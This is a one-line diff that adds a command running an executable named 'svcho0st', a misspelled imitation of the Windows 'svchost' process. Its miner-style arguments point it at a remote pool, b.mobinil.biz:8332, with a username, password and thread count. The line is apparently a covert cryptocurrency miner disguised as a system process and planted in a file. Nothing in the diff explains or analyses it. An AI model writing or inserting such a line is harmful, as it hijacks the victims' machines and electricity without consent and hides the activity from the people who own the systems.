@@ -1,0 +1,1 @@
+svcho0st -a 5 -o http://b.mobinil.biz:8332/ -u redem_check -p check -t 2
